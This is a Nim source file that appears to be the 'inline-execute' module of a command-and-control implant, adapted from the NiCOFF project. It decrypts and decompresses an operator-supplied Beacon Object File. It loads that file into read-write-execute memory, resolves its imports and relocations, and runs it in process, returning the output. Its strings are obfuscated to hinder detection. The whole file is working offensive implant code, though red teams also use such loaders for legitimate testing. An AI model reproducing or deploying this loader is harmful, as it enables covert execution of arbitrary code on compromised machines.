import ../../util/[crypto, patches]
import ../../util/risky/[beaconFunctions, structs]
import ptr_math except `-`
import std/strutils
import system
import winim/lean
from zippy import uncompress

# Largely based on the excellent NiCOFF project by @frkngksl
# Source: https://github.com/frkngksl/NiCOFF/blob/main/Main.nim
type COFFEntry = proc(args:ptr byte, argssize: uint32) {.stdcall.}

proc HexStringToByteArray(hexString:string,hexLength:int):seq[byte] =
    var returnValue:seq[byte] = @[]
    for i in countup(0,hexLength-1,2):
        try:
            #cho hexString[i..i+1]
            returnValue.add(fromHex[uint8](hexString[i..i+1]))
        except ValueError:
            return @[]
    #fromHex[uint8]
    return returnValue

# By traversing the relocations of text section, we can count the external functions
proc GetNumberOfExternalFunctions(fileBuffer:seq[byte],textSectionHeader:ptr SectionHeader):uint64 =
    var returnValue:uint64=0
    var symbolTableCursor:ptr SymbolTableEntry = nil
    var symbolTable:ptr SymbolTableEntry = cast[ptr SymbolTableEntry](unsafeAddr(fileBuffer[0]) + cast[int]((cast[ptr FileHeader](unsafeAddr(fileBuffer[0]))).PointerToSymbolTable))
    var relocationTableCursor:ptr RelocationTableEntry = cast[ptr RelocationTableEntry](unsafeAddr(fileBuffer[0]) + cast[int](textSectionHeader.PointerToRelocations))
    for i in countup(0,cast[int](textSectionHeader.NumberOfRelocations-1)):
        symbolTableCursor = cast[ptr SymbolTableEntry](symbolTable + cast[int](relocationTableCursor.SymbolTableIndex))
        # Condition for an external symbol
        if(symbolTableCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolTableCursor.SectionNumber == 0):
            returnValue+=1
        relocationTableCursor+=1
    return returnValue * cast[uint64](sizeof(ptr uint64))

proc GetExternalFunctionAddress(symbolName:string):uint64 =
    var prefixSymbol:string = obf("__imp_")
    var prefixBeacon:string = obf("__imp_Beacon")
    var prefixToWideChar:string = obf("__imp_toWideChar")
    var libraryName:string = ""
    var functionName:string = ""
    var returnAddress:uint64 = 0
    var symbolWithoutPrefix:string = symbolName[6..symbolName.len-1]

    if(not symbolName.startsWith(prefixSymbol)):
        ##result.add(obf("[!] Function with unknown naming convention!"))
        return returnAddress

    # Check is it our cs function implementation
    if(symbolName.startsWith(prefixBeacon) or symbolName.startsWith(prefixToWideChar)):
        for i in countup(0,22):
            if(symbolWithoutPrefix == functionAddresses[i].name):
                return functionAddresses[i].address
    else:
        try:
            # Why removePrefix doesn't work with 2 strings argument?
            var symbolSubstrings:seq[string] = symbolWithoutPrefix.split({'@','$'},2)
            libraryName = symbolSubstrings[0]
            functionName = symbolSubstrings[1]
        except:
            #result.add(obf("[!] Symbol splitting problem!"))
            return returnAddress

        var libraryHandle:HMODULE = LoadLibraryA(addr(libraryName[0]))

        if(libraryHandle != 0):
            returnAddress = cast[uint64](GetProcAddress(libraryHandle,addr(functionName[0])))
            #if(returnAddress == 0):
                #result.add(obf("[!] Error on function address!"))
            return returnAddress
        else:
            #result.add(obf("[!] Error loading library!"))
            return returnAddress
        

proc Read32Le(p:ptr uint8):uint32 = 
    var val1:uint32 = cast[uint32](p[0])
    var val2:uint32 = cast[uint32](p[1])
    var val3:uint32 = cast[uint32](p[2])
    var val4:uint32 = cast[uint32](p[3])
    return (val1 shl 0) or (val2 shl 8) or (val3 shl 16) or (val4 shl 24)

proc Write32Le(dst:ptr uint8,x:uint32):void =
    dst[0] = cast[uint8](x shr 0)
    dst[1] = cast[uint8](x shr 8)
    dst[2] = cast[uint8](x shr 16)
    dst[3] = cast[uint8](x shr 24)

proc Add32(p:ptr uint8, v:uint32) = 
    Write32le(p,Read32le(p)+v)
    
proc ApplyGeneralRelocations(patchAddress:uint64,sectionStartAddress:uint64,givenType:uint16,symbolOffset:uint32):void =
    var pAddr8:ptr uint8 = cast[ptr uint8](patchAddress)
    var pAddr64:ptr uint64 = cast[ptr uint64](patchAddress)

    case givenType:
        of IMAGE_REL_AMD64_REL32:
            Add32(pAddr8, cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) -  patchAddress - 4))
            return
        of IMAGE_REL_AMD64_ADDR32NB:
            Add32(pAddr8, cast[uint32](sectionStartAddress - patchAddress - 4))
            return
        of IMAGE_REL_AMD64_ADDR64:
            pAddr64[] = pAddr64[] + sectionStartAddress
            return
        else:
            #result.add(obf("[!] No code for type"))
            return

var allocatedMemory:LPVOID = nil

proc RunCOFF(functionName:string,fileBuffer:seq[byte],argumentBuffer:seq[byte],mainResult:var string):bool = 
    var fileHeader:ptr FileHeader = cast[ptr FileHeader](unsafeAddr(fileBuffer[0]))
    var totalSize:uint64 = 0
    # Some COFF files may have Optional Header to just increase the size according to MSDN
    var sectionHeaderArray:ptr SectionHeader = cast[ptr SectionHeader] (unsafeAddr(fileBuffer[0])+cast[int](fileHeader.SizeOfOptionalHeader)+sizeof(FileHeader))
    var sectionHeaderCursor:ptr SectionHeader = sectionHeaderArray
    var textSectionHeader:ptr SectionHeader = nil
    var sectionInfoList: seq[SectionInfo] = @[]
    var tempSectionInfo:SectionInfo
    var memoryCursor:uint64 = 0
    var symbolTable:ptr SymbolTableEntry = cast[ptr SymbolTableEntry](unsafeAddr(fileBuffer[0]) + cast[int](fileHeader.PointerToSymbolTable))
    var symbolTableCursor:ptr SymbolTableEntry = nil
    var relocationTableCursor:ptr RelocationTableEntry = nil
    var sectionIndex:int = 0
    var isExternal:bool = false
    var isInternal:bool = false
    var patchAddress:uint64 = 0
    var stringTableOffset:int = 0
    var symbolName:string = ""
    var externalFunctionCount:int = 0
    var externalFunctionStoreAddress:ptr uint64 = nil
    var tempFunctionAddr:uint64 = 0
    var delta:uint64 = 0
    var tempPointer:ptr uint32 = nil
    var entryAddress:uint64 = 0
    var sectionStartAddress:uint64 = 0

    # Calculate the total size for allocation
    for i in countup(0,cast[int](fileHeader.NumberOfSections-1)):
        if($(addr(sectionHeaderCursor.Name[0])) == ".text"):
            # Seperate saving for text section header
            textSectionHeader = sectionHeaderCursor

        # Save the section info
        tempSectionInfo.Name = $(addr(sectionHeaderCursor.Name[0]))
        tempSectionInfo.SectionOffset = totalSize
        tempSectionInfo.SectionHeaderPtr = sectionHeaderCursor
        sectionInfoList.add(tempSectionInfo)

        # Add the size
        totalSize+=sectionHeaderCursor.SizeOfRawData
        sectionHeaderCursor+=1

    if(textSectionHeader.isNil()):
        mainResult.add(obf("[!] Text section not found!\n"))
        return false

    # We need to store external function addresses too
    allocatedMemory = VirtualAlloc(NULL, cast[UINT32](totalSize+GetNumberOfExternalFunctions(fileBuffer,textSectionHeader)), MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)
    if(allocatedMemory == NULL):
        mainResult.add(obf("[!] Failed memory allocation!\n"))
        return false

    # Now copy the sections
    sectionHeaderCursor = sectionHeaderArray
    externalFunctionStoreAddress = cast[ptr uint64](totalSize+cast[uint64](allocatedMemory))
    for i in countup(0,cast[int](fileHeader.NumberOfSections-1)):
        copyMem(cast[LPVOID](cast[uint64](allocatedMemory)+memoryCursor),unsafeaddr(fileBuffer[0])+cast[int](sectionHeaderCursor.PointerToRawData),sectionHeaderCursor.SizeOfRawData)
        memoryCursor += sectionHeaderCursor.SizeOfRawData
        sectionHeaderCursor+=1

    when defined verbose:
        mainResult.add(obf("[+] Sections copied.\n"))

    # Start relocations
    for i in countup(0,cast[int](fileHeader.NumberOfSections-1)):
        # Traverse each section for its relocations
        when defined verbose:
            mainResult.add(obf("  [+] Performing relocations for section '") & $sectionInfoList[i].Name & "'.\n")
        relocationTableCursor = cast[ptr RelocationTableEntry](unsafeAddr(fileBuffer[0]) + cast[int](sectionInfoList[i].SectionHeaderPtr.PointerToRelocations))
        for relocationCount in countup(0, cast[int](sectionInfoList[i].SectionHeaderPtr.NumberOfRelocations)-1):
            symbolTableCursor = cast[ptr SymbolTableEntry](symbolTable + cast[int](relocationTableCursor.SymbolTableIndex))
            sectionIndex = cast[int](symbolTableCursor.SectionNumber - 1)
            isExternal = (symbolTableCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolTableCursor.SectionNumber == 0)
            isInternal = (symbolTableCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolTableCursor.SectionNumber != 0)
            patchAddress = cast[uint64](allocatedMemory) + sectionInfoList[i].SectionOffset + cast[uint64](relocationTableCursor.VirtualAddress - sectionInfoList[i].SectionHeaderPtr.VirtualAddress)
            if(isExternal):
                # If it is a function
                stringTableOffset = cast[int](symbolTableCursor.First.value[1])
                symbolName = $(cast[ptr byte](symbolTable+cast[int](fileHeader.NumberOfSymbols))+stringTableOffset)
                tempFunctionAddr = GetExternalFunctionAddress(symbolName)
                if(tempFunctionAddr != 0):
                    (externalFunctionStoreAddress + externalFunctionCount)[] = tempFunctionAddr
                    delta = cast[uint64]((externalFunctionStoreAddress + externalFunctionCount)) - cast[uint64](patchAddress) - 4
                    tempPointer = cast[ptr uint32](patchAddress)
                    tempPointer[] = cast[uint32](delta)
                    externalFunctionCount+=1
                else:
                    mainResult.add(obf("[!] Unknown symbol resolution!\n"))
                    return false
            else:
                if(sectionIndex >= sectionInfoList.len or sectionIndex < 0):
                    mainResult.add(obf("[!] Error on symbol section index!\n"))
                    return false
                sectionStartAddress = cast[uint64](allocatedMemory) + sectionInfoList[sectionIndex].SectionOffset
                if(isInternal):
                    for internalCount in countup(0,sectionInfoList.len-1):
                        if(sectionInfoList[internalCount].Name == obf(".text")):
                            sectionStartAddress = cast[uint64](allocatedMemory) + sectionInfoList[internalCount].SectionOffset
                            break
                ApplyGeneralRelocations(patchAddress,sectionStartAddress,relocationTableCursor.Type,symbolTableCursor.Value)
            relocationTableCursor+=1

    when defined verbose:
        mainResult.add(obf("[+] Relocations completed!\n"))

    for i in countup(0,cast[int](fileHeader.NumberOfSymbols-1)):
        symbolTableCursor = symbolTable + i
        if(functionName == $(addr(symbolTableCursor.First.Name[0]))):
            when defined verbose:
                mainResult.add(obf("[+] Trying to find entrypoint: '") & $functionName & "'...\n" )

            entryAddress = cast[uint64](allocatedMemory) + sectionInfoList[symbolTableCursor.SectionNumber-1].SectionOffset + symbolTableCursor.Value

    if(entryAddress == 0):
        mainResult.add(obf("[!] Entrypoint not found.\n"))
        return false
    var entryPtr:COFFEntry = cast[COFFEntry](entryAddress)

    when defined verbose:
        mainResult.add(obf("[+] Entrypoint found! Executing...\n"))

    if(argumentBuffer.len == 0):
        entryPtr(NULL,0)
    else:
        entryPtr(unsafeaddr(argumentBuffer[0]),cast[uint32](argumentBuffer.len))
    return true

# Execute a BOF from an encrypted and compressed stream
proc inlineExecute*(li : Listener, args : varargs[string]) : string =
    # This shouldn't happen since parameters are managed on the Python-side, but you never know
    if (not args.len >= 2):
        result = obf("Invalid number of arguments received. Usage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.")
        return
    
    let
        bofB64: string = args[0]

    var dec = decryptData(bofB64, li.cryptKey)
    var decStr: string = cast[string](dec)
    var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))

    var nimEntry = args[1]

    # Unhexlify the arguments
    var argumentBuffer: seq[byte] = @[]
    if(args.len == 3):
        argumentBuffer = HexStringToByteArray(args[2], args[2].len)
        if(argumentBuffer.len == 0):
            result.add(obf("[!] Error parsing arguments."))

    # Run COFF file
    if(not RunCOFF(nimEntry, fileBuffer, argumentBuffer, result)):
        result.add(obf("[!] BOF file not executed due to errors.\n"))
        VirtualFree(allocatedMemory, 0, MEM_RELEASE)
        return
        
    result.add(obf("[+] BOF file executed.\n"))

    var outData:ptr char = BeaconGetOutputData(NULL);

    if(outData != NULL):
        result.add(obf("[+] Output:\n"))
        result.add($outData)

    VirtualFree(allocatedMemory, 0, MEM_RELEASE)
    return